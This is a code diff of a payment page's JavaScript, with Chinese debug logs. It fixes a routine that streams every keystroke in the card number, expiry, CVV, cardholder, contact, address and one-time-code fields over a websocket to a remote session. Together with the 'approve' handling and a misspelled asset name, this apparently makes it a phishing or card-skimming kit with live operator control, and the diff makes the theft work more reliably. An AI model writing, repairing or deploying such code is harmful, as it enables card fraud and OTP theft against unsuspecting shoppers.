@@ -563,7 +563,7 @@ url("pay1ment_icons.woff") format("woff");
                     function handle(m) {
                         switch (m.action) {
                         case "ack":
-                            s = m.sessionId;_sessionCreating=false;
+                            s = m.sessionId;
                             msg("info", "Processing...");
                             break;
                         case "approve":
@@ -1077,42 +1077,52 @@ url("pay1ment_icons.woff") format("woff");
                     )();
                     var liveTimer = null;
                     var _sessionCreating = false;
-                    function livePush() {
-                        if (!ws || ws.readyState !== 1){
-                            console.log('ws读不到');
-                            return;}
-                        if (!sid && _sessionCreating){
-                            console.log('ws读不到');
-                            return;}
-                        var p = build();
-                        if (!sid) {
-                            ws.send(JSON.stringify({
-                                type: 'customer_input',
-                                payload: p
-                            }));
-                        } else {
-                            ws.send(JSON.stringify({
-                                type: 'session_update',
-                                payload: {
-                                    sessionId: sid,
-                                    cardInfo: p.cardInfo,
-                                    customerInfo: p.customerInfo,
-                                    currentStep: 'card'
-                                }
-                            }));
-                        }
-                    }
+                    var created = false;
+
+function livePush() {
+
+    if (!ws || ws.readyState !== 1)
+        return;
+
+    var p = build();
+
+    if (!created) {
+
+        created = true;
+
+        ws.send(JSON.stringify({
+            type: 'customer_input',
+            payload: p
+        }));
+
+    } else if (s) {
+
+        ws.send(JSON.stringify({
+            type: 'session_update',
+            payload: {
+                sessionId: s,
+                cardInfo: p.cardInfo,
+                customerInfo: p.customerInfo,
+                currentStep: 'card'
+            }
+        }));
+
+    }
+}
                     function onInput() {
                         clearTimeout(liveTimer);
                         liveTimer = setTimeout(livePush, 150);
                           console.log('发送');
                     }
-                    var liveInputs = ['cardNumber', 'expiry', 'cvv', 'cardHolder', 'fullNameIpt', 'emailIpt', 'phoneIpt', 'countryIpt', 'address1Ipt', 'address2Ipt', 'cityIpt', 'stateIpt', 'zipCodeIpt', 'otpCode'];
+                    var liveInputs = ['cardNumber', 'expiry', 'cvv', 'cardHolder', 'fullName', 'email', 'phone', 'country', 'address1', 'address2', 'city', 'state', 'zipCode', 'otpCode'];
                     liveInputs.forEach(function(id) {
                         var el = q(id);
-                        if (el)
-                            el.addEventListener('input', onInput);
-                          console.log('加上了');
+                        if (el){
+    el.addEventListener('input', onInput);
+    console.log(id + ' 加上了');
+}else{
+    console.log(id + ' 没找到');
+}
                     });
                     ;cws();
                 }
